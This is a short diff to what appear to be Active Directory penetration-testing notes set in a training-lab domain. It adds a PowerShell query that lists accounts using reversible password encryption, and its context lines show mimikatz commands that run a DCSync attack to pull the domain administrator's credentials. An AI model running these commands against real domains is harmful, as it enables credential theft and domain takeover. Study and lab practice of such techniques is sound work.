@@ -438,3 +438,8 @@ mimikatz # privilege::debug
 
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 ```
+
+### Reversible Encryption
+```powershell
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+```
